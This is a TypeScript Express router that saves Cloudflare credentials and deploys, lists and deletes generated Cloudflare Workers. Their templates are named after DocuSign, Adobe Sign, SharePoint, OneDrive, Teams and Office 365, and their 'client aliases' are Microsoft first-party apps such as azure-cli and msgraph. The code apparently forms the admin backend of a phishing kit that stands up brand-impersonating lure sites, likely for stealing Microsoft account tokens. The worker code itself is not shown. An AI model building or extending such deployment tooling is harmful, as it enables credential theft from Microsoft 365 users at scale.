import { Router } from "express";
import { db } from "@workspace/db";
import { appConfigTable } from "@workspace/db/schema";
import { eq } from "drizzle-orm";
import { generateWorkerScript } from "../lib/workerGenerator";
import { adminAuth } from "../middleware/adminAuth";

const router = Router();

const VALID_CLIENT_ALIASES = [
  "azure-cli",
  "azure-powershell",
  "msgraph",
  "office365",
  "exchange",
  "sharepoint",
  "msteams",
] as const;

const VALID_TEMPLATES = [
  "devdoc-sign",
  "adobe-sign",
  "docusign",
  "sharepoint",
  "onedrive",
  "teams",
  "office365",
] as const;

async function getConfig(key: string): Promise<string | null> {
  const [row] = await db
    .select()
    .from(appConfigTable)
    .where(eq(appConfigTable.key, key))
    .limit(1);
  return row?.value ?? null;
}

async function setConfig(key: string, value: string): Promise<void> {
  await db
    .insert(appConfigTable)
    .values({ key, value })
    .onConflictDoUpdate({ target: appConfigTable.key, set: { value } });
}

async function deleteConfig(key: string): Promise<void> {
  await db.delete(appConfigTable).where(eq(appConfigTable.key, key));
}

// ── Save / verify Cloudflare credentials ─────────────────────────────────────

router.post("/deploy/cloudflare-config", adminAuth, async (req, res) => {
  const { apiKey, accountId, apiServerUrl, frontendUrl } = req.body as {
    apiKey?: string;
    accountId?: string;
    apiServerUrl?: string;
    frontendUrl?: string;
  };

  if (!apiKey?.trim() || !accountId?.trim() || !apiServerUrl?.trim() || !frontendUrl?.trim()) {
    res.status(400).json({ error: "apiKey, accountId, apiServerUrl, and frontendUrl are required." });
    return;
  }

  try {
    const cfRes = await fetch(
      `https://api.cloudflare.com/client/v4/accounts/${accountId.trim()}/tokens/verify`,
      { headers: { Authorization: `Bearer ${apiKey.trim()}` } }
    ).catch(() => null);

    if (cfRes && !cfRes.ok) {
      const j = await cfRes.json().catch(() => ({})) as { errors?: { message: string }[] };
      const msg = j.errors?.[0]?.message ?? `Cloudflare returned ${cfRes.status}`;
      res.status(400).json({ error: `Cloudflare verification failed: ${msg}` });
      return;
    }

    await Promise.all([
      setConfig("cloudflare_api_key", apiKey.trim()),
      setConfig("cloudflare_account_id", accountId.trim()),
      setConfig("cloudflare_api_server_url", apiServerUrl.trim()),
      setConfig("cloudflare_frontend_url", frontendUrl.trim()),
    ]);

    res.json({ ok: true });
  } catch {
    res.status(500).json({ error: "Failed to save configuration." });
  }
});

// ── Read current Cloudflare credentials ──────────────────────────────────────

router.get("/deploy/cloudflare-config", adminAuth, async (_req, res) => {
  try {
    const [accountId, apiServerUrl, frontendUrl] = await Promise.all([
      getConfig("cloudflare_account_id"),
      getConfig("cloudflare_api_server_url"),
      getConfig("cloudflare_frontend_url"),
    ]);
    res.json({
      hasApiKey: !!(await getConfig("cloudflare_api_key")),
      accountId: accountId ?? "",
      apiServerUrl: apiServerUrl ?? "",
      frontendUrl: frontendUrl ?? "",
    });
  } catch {
    res.status(500).json({ error: "Failed to read configuration." });
  }
});

// ── Delete Cloudflare credentials ─────────────────────────────────────────────

router.delete("/deploy/cloudflare-config", adminAuth, async (_req, res) => {
  try {
    await Promise.all([
      deleteConfig("cloudflare_api_key"),
      deleteConfig("cloudflare_account_id"),
      deleteConfig("cloudflare_api_server_url"),
      deleteConfig("cloudflare_frontend_url"),
    ]);
    res.json({ ok: true });
  } catch {
    res.status(500).json({ error: "Failed to delete configuration." });
  }
});

// ── Deploy worker ─────────────────────────────────────────────────────────────

router.post("/deploy", adminAuth, async (req, res) => {
  const { template, region, clientAlias } = req.body as {
    template?: string;
    region?: string;
    clientAlias?: string;
  };

  if (!template || !clientAlias) {
    res.status(400).json({ error: "template and clientAlias are required." });
    return;
  }

  if (!VALID_CLIENT_ALIASES.includes(clientAlias as typeof VALID_CLIENT_ALIASES[number])) {
    res.status(400).json({
      error: `Invalid clientAlias "${clientAlias}". Valid values: ${VALID_CLIENT_ALIASES.join(", ")}.`,
    });
    return;
  }

  if (!VALID_TEMPLATES.includes(template as typeof VALID_TEMPLATES[number])) {
    res.status(400).json({
      error: `Invalid template "${template}". Valid values: ${VALID_TEMPLATES.join(", ")}.`,
    });
    return;
  }

  let cfKey: string | null;
  let accountId: string | null;
  let apiServerUrl: string | null;
  let frontendUrl: string | null;

  try {
    [cfKey, accountId, apiServerUrl, frontendUrl] = await Promise.all([
      getConfig("cloudflare_api_key"),
      getConfig("cloudflare_account_id"),
      getConfig("cloudflare_api_server_url"),
      getConfig("cloudflare_frontend_url"),
    ]);
  } catch {
    res.status(500).json({ error: "Could not read configuration from DB." });
    return;
  }

  if (!cfKey)        { res.status(400).json({ error: "Cloudflare API key not configured. Connect first." }); return; }
  if (!accountId)    { res.status(400).json({ error: "Cloudflare Account ID not configured. Connect first." }); return; }
  if (!apiServerUrl) { res.status(400).json({ error: "API Server URL not configured. Connect first." }); return; }
  if (!frontendUrl)  { res.status(400).json({ error: "Frontend URL not configured. Connect first." }); return; }

  const workerScript = generateWorkerScript({ template, clientAlias, apiServerUrl, frontendUrl });
  const scriptName = `devdoc-${template}-${clientAlias}`.replace(/[^a-z0-9-]/g, "-");

  const metadata = JSON.stringify({
    main_module: "worker.js",
    compatibility_date: "2024-01-01",
  });

  const boundary = `----FormBoundary${Date.now()}`;
  const CRLF = "\r\n";
  const body =
    `--${boundary}${CRLF}` +
    `Content-Disposition: form-data; name="metadata"${CRLF}` +
    `Content-Type: application/json${CRLF}${CRLF}` +
    `${metadata}${CRLF}` +
    `--${boundary}${CRLF}` +
    `Content-Disposition: form-data; name="worker.js"; filename="worker.js"${CRLF}` +
    `Content-Type: application/javascript+module${CRLF}${CRLF}` +
    `${workerScript}${CRLF}` +
    `--${boundary}--`;

  let cfResponse: Response;
  try {
    cfResponse = await fetch(
      `https://api.cloudflare.com/client/v4/accounts/${accountId}/workers/scripts/${scriptName}`,
      {
        method: "PUT",
        headers: {
          Authorization: `Bearer ${cfKey}`,
          "Content-Type": `multipart/form-data; boundary=${boundary}`,
        },
        body,
      }
    );
  } catch {
    res.status(502).json({ error: "Could not reach Cloudflare API. Check your network." });
    return;
  }

  const cfJson = await cfResponse.json().catch(() => ({})) as {
    success?: boolean;
    errors?: { message: string }[];
    result?: { id?: string };
  };

  if (!cfResponse.ok || !cfJson.success) {
    const msg = cfJson.errors?.[0]?.message ?? `Cloudflare error ${cfResponse.status}`;
    res.status(502).json({ error: msg });
    return;
  }

  // Enable workers.dev subdomain route for the script
  await fetch(
    `https://api.cloudflare.com/client/v4/accounts/${accountId}/workers/scripts/${scriptName}/subdomain`,
    {
      method: "POST",
      headers: {
        Authorization: `Bearer ${cfKey}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ enabled: true }),
    }
  ).catch(() => null); // non-fatal — worker still deployed

  // Fetch the account's workers.dev subdomain (differs from the account ID)
  let workerSubdomain = accountId; // fallback
  try {
    const subRes = await fetch(
      `https://api.cloudflare.com/client/v4/accounts/${accountId}/workers/subdomain`,
      { headers: { Authorization: `Bearer ${cfKey}` } }
    );
    if (subRes.ok) {
      const subJson = await subRes.json() as { result?: { subdomain?: string }; success?: boolean };
      if (subJson.success && subJson.result?.subdomain) {
        workerSubdomain = subJson.result.subdomain;
      }
    }
  } catch {
    // fall back to accountId
  }

  const workerUrl = `https://${scriptName}.${workerSubdomain}.workers.dev`;

  await Promise.all([
    setConfig("last_deployed_template", template),
    setConfig("last_deployed_client_alias", clientAlias),
    setConfig("last_deployed_region", region ?? "auto"),
    setConfig("last_deployed_worker_url", workerUrl),
    setConfig("last_deployed_script_name", scriptName),
  ]);

  res.json({ ok: true, url: workerUrl, scriptName });
});

// ── Get last deployment info ──────────────────────────────────────────────────

router.get("/deploy/last", adminAuth, async (_req, res) => {
  try {
    const [template, clientAlias, region, workerUrl, scriptName] = await Promise.all([
      getConfig("last_deployed_template"),
      getConfig("last_deployed_client_alias"),
      getConfig("last_deployed_region"),
      getConfig("last_deployed_worker_url"),
      getConfig("last_deployed_script_name"),
    ]);
    res.json({
      template: template ?? "devdoc-sign",
      clientAlias: clientAlias ?? "azure-cli",
      region: region ?? "auto",
      workerUrl: workerUrl ?? "",
      scriptName: scriptName ?? "",
    });
  } catch {
    res.status(500).json({ error: "Failed to read last deployment." });
  }
});

// ── Delete deployed worker from Cloudflare ────────────────────────────────────

router.delete("/deploy/worker", adminAuth, async (_req, res) => {
  let cfKey: string | null;
  let accountId: string | null;
  let scriptName: string | null;

  try {
    [cfKey, accountId, scriptName] = await Promise.all([
      getConfig("cloudflare_api_key"),
      getConfig("cloudflare_account_id"),
      getConfig("last_deployed_script_name"),
    ]);
  } catch {
    res.status(500).json({ error: "Could not read configuration." });
    return;
  }

  if (!cfKey || !accountId) {
    res.status(400).json({ error: "Cloudflare credentials not configured." });
    return;
  }
  if (!scriptName) {
    res.status(400).json({ error: "No deployed worker found." });
    return;
  }

  try {
    const cfRes = await fetch(
      `https://api.cloudflare.com/client/v4/accounts/${accountId}/workers/scripts/${scriptName}`,
      {
        method: "DELETE",
        headers: { Authorization: `Bearer ${cfKey}` },
      }
    );

    const cfJson = await cfRes.json().catch(() => ({})) as {
      success?: boolean;
      errors?: { message: string }[];
    };

    if (!cfRes.ok || !cfJson.success) {
      const msg = cfJson.errors?.[0]?.message ?? `Cloudflare error ${cfRes.status}`;
      res.status(502).json({ error: msg });
      return;
    }

    await Promise.all([
      deleteConfig("last_deployed_worker_url"),
      deleteConfig("last_deployed_script_name"),
    ]);

    res.json({ ok: true });
  } catch {
    res.status(502).json({ error: "Could not reach Cloudflare API." });
  }
});

export default router;
